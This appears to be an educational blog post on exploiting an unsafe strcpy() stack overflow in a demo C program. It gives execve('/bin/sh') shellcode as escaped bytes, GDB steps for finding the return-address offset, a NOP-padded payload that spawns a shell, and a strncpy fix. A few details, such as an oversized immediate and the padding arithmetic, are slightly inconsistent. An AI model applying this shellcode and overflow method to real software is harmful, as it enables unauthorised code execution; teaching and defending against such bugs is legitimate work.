---
title: "Unsafe functions vulnerabilities in C"
date: 2026-02-10
author: Fiti
description: How to inject a shellcode into a vulnerable software in C.
tags:
  - c
  - security
  - shellcode
---
## Introduction

It is well known that C is a programming language that gives you a lot of freedom in memory management, with both advantages and drawbacks. In this page I would like to show an example of vulnerability analysis, to demonstrate that something that apparently looks inoffensive, or just a simple "segmentation fault" can, depending on the application, turn into a real security vulnerability.

## Environment 

| Element          | Version            |
| ---------------- | ------------------ |
| Operating System | Ubuntu 24.04.3 LTS |
| Architecture     | x86\_64 (64 bits)   |
| GCC              | 13.3.0             |
| OBJDUMP          | 2.42               |
| LD               | 2.42               |
| NASM             | 2.16.01            |

## The vulnerable program

This is an example of a typical (unsafe) use of an insecure function like `strcpy()` , which copies the content of the source into the destination pointer until a null terminator  `\0`  is found.

```c
#include <stdio.h>
#include <string.h>

void copy_info(char *info)
{
    char buf[80];
    strcpy(buf, info);

    printf("Introduced text: %s\n", buf);
}

int main(int argc, char *argv[]) {
    copy_info(argv[1]);

    return 0;
}
```

The risk comes because the function does not check the size of the destination buffer, so it can lead to a buffer overflow, potentially writing into memory outside of our "variable".

In order to compile the example, we need to use the following command:

```shell
gcc -m64 -fno-stack-protector -z execstack -no-pie example.c -o example
```

 - `-fno-stack-protector` : By default, there are some security mechanisms (canaries) that detect when an overflow is happening. We remove it because otherwise our overflow will be prevented.
 - `execstack` : Allows execution on the stack.
 - `no-pie` : This is a precondition to disable ASLR (Address Space Layout Randomization). This option is recommended for demonstration purposes because otherwise, the base address of the stack will be different, and it would make executing the vulnerability harder.


Then we run it:

```shell
$ ./example "hello"
Introduced text: hello
```

Let's see how we can take advantage of the unsafe usage of that function to open a shell. We are introducing the string via stdin, but it can come from any other source.

## Creating the shellcode

There are many ready-made shellcodes available online, but for learning purposes we will create our own. 

The easiest way to do this is to let the compiler (`gcc`) generate it for us. 

First, we write a small C program that simply spawns a shell:

```c
#include <unistd.h>
int main( )
{
  char* argv[2];
  argv[0] = "/bin/sh";
  argv[1] = 0;
  execve("/bin/sh", argv, NULL);
  return 0;
}
```

Then compile it:

```shell
gcc -m64 -O0 -no-pie -fno-stack-protector shellcode.c -o shellcode
```

And dump the code with `objdump`:

```asm
115 0000000000401136 <main>:
116   401136: f3 0f 1e fa           endbr64
117   40113a: 55                    push   rbp
118   40113b: 48 89 e5              mov    rbp,rsp
119   40113e: 48 83 ec 10           sub    rsp,0x10
120   401142: 48 8d 05 bb 0e 00 00  lea    rax,[rip+0xebb]        # 402004 <_IO_stdin_used+0x4>
121   401149: 48 89 45 f0           mov    QWORD PTR [rbp-0x10],rax
122   40114d: 48 c7 45 f8 00 00 00  mov    QWORD PTR [rbp-0x8],0x0
123   401154: 00
124   401155: 48 8d 45 f0           lea    rax,[rbp-0x10]
125   401159: ba 00 00 00 00        mov    edx,0x0
126   40115e: 48 89 c6              mov    rsi,rax
127   401161: 48 8d 05 9c 0e 00 00  lea    rax,[rip+0xe9c]        # 402004 <_IO_stdin_used+0x4>
128   401168: 48 89 c7              mov    rdi,rax
129   40116b: e8 d0 fe ff ff        call   401040 <execve@plt>
130   401170: b8 00 00 00 00        mov    eax,0x0
131   401175: c9                    leave
132   401176: c3                    ret
133
134 Disassembly of section .fini:
```

We **cannot** use this code directly as shellcode because it contains too much "noise" (memory initializations, argument handling, literal loads from  .data , etc.).

The code is actually quite simple: it loads the arguments into  `%rdi` and `%rsi` , and then executes the function. 

That is the part we want to copy and use as shellcode (note that the second argument is a null-terminated array, which in C is just a zero).

The bigger issue is that we are loading the string literal `/bin/sh` from the data section, and we need to embed it directly into the code. A clever way to do this is to convert it into an int. For that, I used Python to perform the conversion.

```shell
$ python3
>>> n = int.from_bytes(b'/bin/sh', 'little')
>>> hex(n)
'0x68732f2f6e69622f'
```

So the final `nasm` code would be:

```asm
BITS 64
global _start

_start:
    endbr64
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x10

    xor rax, rax
    push rax

    mov rax, 0x0068732f2f6e69622f
    push rax

    mov rdi, rsp

    xor rax, rax
    push rax

    mov rsi, rsp
    xor rdx, rdx
    mov al, 59
    syscall
```

By using `nasm` and `ld` we can test it:

```shell
$ nasm -f elf64 shellcode.nasm
$ ld shellcode.o -o shellcode

$ ./shellcode
$ > whoami
fiti
$ > exit
$
```

Great, now we need to "extract" the shellcode from it. In other words, get the "code" that we need to "inject" into the software.

As we are going to use the encoded `hex` code, I used `objdump` for that.

```shell
objdump -d -M intel64 shellcode.o

shellcode.o:    file format elf64-x86-64

Disassembly of section .text:

000000000000000 <_start>:

    0:    f3 0f 1e fa       endbr64
    4:    55                push   %rbp
    5:    48 89 e5          mov    %rsp,%rbp
    8:    48 83 ec 10       sub    $0x10,%rsp
    
    ..... etc ...
```

> Note: A small change I've done is to reserve more memory into the stack (0x10 -> 0x80), to prevent the shellcode to overwrite itself.

All we need to do is to copy the hexadecimal code of the shellcode and build a string by escaping them:

```plain
\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\x48\x83\xec\x10\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05
```

Now we are ready to inject the shellcode into our test program!

## Injecting the shellcode

There are several things we need to know to inject the shellcode, but the most important is the base address. As we disabled `ASLR`, the base address will be the same for all executions. If we wouldn't disable it, it complicates a bit, because every time the program executes, the base address would be different. In that case, "brute force" can be used, by executing multiple times the program until hit the right address.

Let's explore it with **GDB**:

```shell
gdb example
```

First thing to do is to explore the return address of the function `copy_info()`. For that, we can disassemble the `main()` and put a breakpoint just before calling `copy_info()`:

```shell
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401197 <+0>:	endbr64
   0x000000000040119b <+4>:	push   %rbp
   0x000000000040119c <+5>:	mov    %rsp,%rbp
   0x000000000040119f <+8>:	sub    $0x10,%rsp
   0x00000000004011a3 <+12>:	mov    %edi,-0x4(%rbp)
   0x00000000004011a6 <+15>:	mov    %rsi,-0x10(%rbp)
   0x00000000004011aa <+19>:	mov    -0x10(%rbp),%rax
   0x00000000004011ae <+23>:	add    $0x8,%rax
   0x00000000004011b2 <+27>:	mov    (%rax),%rax
=> 0x00000000004011b5 <+30>:	mov    %rax,%rdi
   0x00000000004011b8 <+33>:	call   0x401156 <copy_info>
   0x00000000004011bd <+38>:	mov    $0x0,%eax
   0x00000000004011c2 <+43>:	leave
   0x00000000004011c3 <+44>:	ret
```

Then put a breakpoint into `0x4011b5`.

```shell
(gdb) b *0x4011b5
Breakpoint 1 at 0x4011b5
```

And set, initially for testing purposes, the input of `A`'s.

```shell
(gdb) r "AAAAAAAAAA"
```

Then, make a `stepi` (or `si`) to go through `copy_info()` call. Remember that the first thing to be done is pushing into the stack the return address. So, printing the stack pointer, we know where it is located the return address:

```shell
(gdb) r "AAAAAAAAAA"
Starting program: /home/fiti/Repositories/PRAC/example "AAAAAAAAAA"
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00000000004011b5 in main ()
(gdb) si
0x00000000004011b8 in main ()
(gdb) si
0x0000000000401156 in copy_info ()
(gdb) x $rsp
0x7fffffffdc38:	0x004011bd
```

So we know that the return address is, of course, `0x4011bd` (we already know that from the disassembly), and it is stored at `0x7fffffffdc38`. Remember this address. This is key, because when we inspect the stack, we want to overwrite just that address to change the return address by the one where the shellcode is stored.

Next thing to do is to see how the vulnerable function works. Let's put a breakpoint right after the `strcpy()` function:

```shell
(gdb) disassemble copy_info
Dump of assembler code for function copy_info:
=> 0x0000000000401156 <+0>:	endbr64
   0x000000000040115a <+4>:	push   %rbp
   0x000000000040115b <+5>:	mov    %rsp,%rbp
   0x000000000040115e <+8>:	sub    $0x60,%rsp
   0x0000000000401162 <+12>:	mov    %rdi,-0x58(%rbp)
   0x0000000000401166 <+16>:	mov    -0x58(%rbp),%rdx
   0x000000000040116a <+20>:	lea    -0x50(%rbp),%rax
   0x000000000040116e <+24>:	mov    %rdx,%rsi
   0x0000000000401171 <+27>:	mov    %rax,%rdi
   0x0000000000401174 <+30>:	call   0x401050 <strcpy@plt>
   0x0000000000401179 <+35>:	lea    -0x50(%rbp),%rax
   0x000000000040117d <+39>:	mov    %rax,%rsi
   0x0000000000401180 <+42>:	lea    0xe7d(%rip),%rax        # 0x402004
   0x0000000000401187 <+49>:	mov    %rax,%rdi
   0x000000000040118a <+52>:	mov    $0x0,%eax
   0x000000000040118f <+57>:	call   0x401060 <printf@plt>
   0x0000000000401194 <+62>:	nop
   0x0000000000401195 <+63>:	leave
   0x0000000000401196 <+64>:	ret
End of assembler dump.
(gdb) b *0x401179
Breakpoint 2 at 0x401179
(gdb) c
Continuing.

Breakpoint 2, 0x0000000000401179 in copy_info ()
```

Let's inspect the stack right now:

```shell
(gdb) x/50gx $rsp
0x7fffffffdbd0:	0x0000000006000000	0x00007fffffffe118
0x7fffffffdbe0:	0x4141414141414141	0x00007fffff004141  <--- Here is our string
0x7fffffffdbf0:	0x0000006100000019	0x0000000000000000
0x7fffffffdc00:	0x0000000000000000	0x0000000000000000
0x7fffffffdc10:	0x0000000000000000	0x0000000000000000
0x7fffffffdc20:	0x0000000000000000	0x0000000000000000
0x7fffffffdc30:	0x00007fffffffdc50	0x00000000004011bd  <--- Here is the return addr!
0x7fffffffdc40:	0x00007fffffffdd78	0x00000002ffffdd78
0x7fffffffdc50:	0x00007fffffffdcf0	0x00007ffff7c2a1ca
 .... snip ....
```

Well, this picture is pretty clear: We need to write as much information (our shellcode), and overwrite the address `0x7fffffffdc38` with the address of the start of our shellcode. So we need to calculate exactly how many bytes must be written before the return address. They probably won't match, so we will append at the beginning NOOP until fill it. Remember that, when the cpu starts to execute NOOP, it just go to the next instruction, just like a cascade. Until reach our shellcode.

In human words, what we want to achieve is:

```shell
(gdb) x/50gx $rsp
0x7fffffffdbd0:	0x0000000006000000	0x00007fffffffe118
0x7fffffffdbe0:	0xnoopnoopnoopnoop	0xnoopnoopnoopnoop 
0x7fffffffdbf0:	0xnoopnoopnoopnoop	0xnoopnoopnoopnoop
0x7fffffffdc00:	0xnoopnoopnoopnoop	0xnoopnoopnoopnoop
0x7fffffffdc10:	0xmyshellcode    	0xnoopnoopnoopnoop
0x7fffffffdc20:	0xnoopnoopnoopnoop	0xnoopnoopnoopnoop
0x7fffffffdc30:	0xnoopnoopnoopnoop	0x7fffffffdbe0  <--- Overwritten this addr!
0x7fffffffdc40:	0x00007fffffffdd78	0x00000002ffffdd78
0x7fffffffdc50:	0x00007fffffffdcf0	0x00007ffff7c2a1ca
 .... snip ....
```

The size of the payload (exactly), can be calculated within the `gdb`. Just subtracting the return address with the target one, as follow:

```shell
(gdb) print (0x7fffffffdc38-0x7fffffffdbe0)
$1 = 88
```

We need to create a payload of **88 bytes**, while our shellcode had **44 bytes**, and the return address is **6 bytes** (`0x7fffffffdbe0`), so we need to add a padding of **88-50=38 bytes**. 

We can craft it, directly with the shell (or using python, perl, or whatever you like the most):

```shell
printf '\xf3\x0f\x1e\xfa\x55\x48\x89\xe5\x48\x83\xec\x80\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xc0\x50\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05' > shellcode.bin
```

Doing the same with the `padding.bin` (with NOOP, which is `\x90` code) and `retaddr.bin`, we can concatenate them at the end to get our final exploit:

```shell
cat padding.bin shellcode.bin retaddr.bin > exploit.bin
```

And if we finally execute the original program by passing our exploit as input, we are able to open a shell:

```shell
$ ./example $(cat exploit.bin)
Introduced text: ����������������������������������������������UH��H��H1�PH�/bin//shPH��H1�PH��H1Ұ;����
whoami
fiti

```

Important:

> - GDB is a good playground, but it can confuse you a bit because it adds some things in the stack, modifying the base address. As a consequence of that, your exploit could work in the GDB but not outside it. Instead, you will likely obtain a `SEGFAULT`, generating a `core` dump. This is very useful, because you can open it with `gdb example core` and inspect exactly what the address is, adjusting the exploit for your specific scenario.

## Conclusion

C is a brilliant and powerful language that provides a lot of flexibility with the memory management. However, improper use can cause significant security vulnerabilities. 

In our example, we were able to open a shell in a simple software that was not definitely intended for that. A safer approach for the `copy_info()` function would be:

```c
void copy_info(char *info)
{
    char buf[80];
    strncpy(buf, info, sizeof(buf) - 1); // <--- FIX
	buf[sizeof(buf) - 1] = '\0'; // <---- Force the NULL termination.

    printf("Introduced text: %s\n", buf);
}
```

- By using `strncpy()`, we limit the number of elements to copy, preventing the overflow.
- Forcing the null-terminating, ensure that calling `str` functions is safe (remember that, in C, a string is just an array of chars null terminated).



